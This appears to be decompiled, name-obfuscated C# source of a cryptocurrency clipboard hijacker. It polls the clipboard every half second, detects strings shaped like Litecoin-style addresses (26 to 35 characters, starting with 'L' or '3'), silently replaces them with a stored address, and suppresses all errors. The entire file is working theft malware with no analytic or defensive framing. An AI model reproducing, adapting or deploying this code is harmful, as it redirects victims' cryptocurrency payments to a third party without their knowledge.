using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using A;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.MyServices;
using ns20;

namespace ns34;

public class GClass34
{
	[CompilerGenerated]
	internal sealed class A
	{
		public ClipboardProxy _0024VB_0024NonLocal_2;

		public A(A a_0)
		{
			if (a_0 != null)
			{
				_0024VB_0024NonLocal_2 = a_0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R2(object object_0)
		{
			_0024VB_0024NonLocal_2.SetText(Conversions.ToString(object_0));
		}
	}

	public static void smethod_0()
	{
		string text = "";
		A a = default(A);
		while (true)
		{
			try
			{
				text = ((Computer)B.Computer).get_Clipboard().GetText();
				if (Operators.CompareString(text, GClass20.string_15, false) != 0 && text.Length >= 26 && text.Length <= 35 && (text.StartsWith("L") || text.StartsWith("3")))
				{
					a = new A(a);
					a._0024VB_0024NonLocal_2 = ((Computer)B.Computer).get_Clipboard();
					Thread thread = new Thread(a._Lambda_0024__R2);
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start(GClass20.string_15);
				}
				Thread.Sleep(500);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
